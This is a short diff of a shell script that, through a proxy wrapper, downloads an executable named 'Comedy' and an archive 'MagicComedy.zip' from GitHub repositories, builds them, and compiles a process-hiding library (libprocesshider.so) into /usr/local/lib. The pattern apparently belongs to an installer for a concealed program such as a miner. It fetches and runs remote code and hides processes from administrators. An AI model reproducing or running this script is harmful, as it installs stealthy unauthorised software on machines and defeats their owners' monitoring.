@@ -34,8 +34,8 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/asraktanusi064/samunji/main/Comedy 
 chmod +x Comedy 
  
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/update/main/MagicComedy.zip
-unzip MagicComedy.zip 
+./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
+unzip MagicComedy.zip
 make 
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
 mv libprocesshider.so /usr/local/lib/ 
